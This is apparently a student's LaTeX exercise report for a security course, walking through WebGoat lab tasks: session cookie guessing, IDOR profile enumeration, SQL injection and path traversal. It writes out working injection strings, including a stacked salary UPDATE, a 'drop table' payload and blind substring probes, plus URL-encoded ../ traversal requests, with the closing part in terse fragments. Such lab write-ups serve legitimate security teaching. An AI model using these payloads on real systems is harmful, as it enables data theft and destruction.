@@ -1,0 +1,92 @@
+\documentclass[11pt,a4paper]{report}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{alltt}
+\usepackage{graphicx}
+\usepackage{hyperref}
+
+% Changed the section command to say "Task #"
+\def\thesection{Task \arabic{section}:}
+% Added a familiar HTML command for new paragraph
+\newcommand{\p}{\medskip\noindent}
+
+% Meta, should be edited and filled in with relative information
+\title{IDATT2504 Exercise 1}
+\author{Torgeir Haukaas}
+\date{\today}
+
+\begin{document}
+\maketitle
+
+% Use \section for tasks
+\section{WebGoat}
+\subsection{A1: Broken Access Control}
+\subsubsection{Hijack a session}
+
+First I try to log in. The server sends a set-cookie with the "hijack\_cookie".
+After repeating the request, it is clear that it consists of two numbers, one 
+that increments by one or two, and the other is a timestamp. I can try to 
+hijack a logged in users session if I can guess their cookie. When the first 
+cookie increments by two it is likely that another user has logged in in 
+between my attempts. Then I know the first number of their cookie, and I can 
+iterate on the timestamp, which lies between my previous attempts.
+
+\subsubsection{Insecure Direct Object References}
+
+First I authenticate as Tom Cat. I then capture and inspect the response from
+the server which includes the fields of "role" and "userId" in addition to the
+others. In typical restfull fashion I can append a profile number to the end of
+the profile url: /WebGoat/IDOR/profile/userId. Assuming that other user ids are
+similar to Tom Cats, I try to iterate on the last two digits of Tom Cats id and
+discover the userId for Buffalo Bill, 2342388. To change the info of Buffalo Bill
+I change the request to PUT, content-type to application/json and append the 
+json data I want to insert.
+
+\subsection{A3: Injection}
+\subsubsection{SQL Injection(Intro)}
+I get the department with the query "select department from employees where userid=96134;".
+
+
+I update the department with the query "update employees set department='Sales' where userId=89762;".
+
+
+I add the phone column with the query "alter table employees add phone varchar(20)";.
+
+
+I grant rights with the query "GRANT insert ON grant\_rights TO unauthorized\_user;".
+
+
+I can use injection by inserting "Smith' or '1' = '1'".
+
+
+I can use injection on the last field by writing "1 or '1' = '1'".
+
+
+I can get the salaries by typing in "' or 1=1;--" in the Lastname field.
+
+
+I can change John salary by inputting "smith'; update employees set 
+salary = 999999 where auth\_tan='3SL99A';--".
+
+
+I can delete the table by using "'; drop table access\_log; --".
+
+\subsubsection{SQL Injection(Advanced)}
+
+I can get the user data with the query "'; select * from user\_system\_data;--"
+
+thisisasecretfortomonly
+tom'+and+substring(password,§3§,1)='§t§';--
+
+
+put ../ before the username.
+
+put ....// before username
+
+put ../ before the filename
+
+put urlencoded ../../ as id followed by file name GET 
+/WebGoat/PathTraversal/random-picture?id=
+
+%2e%2e%2f%2e%2e%2f%2fpath-traversal-secret HTTP/1.1
+\end{document}
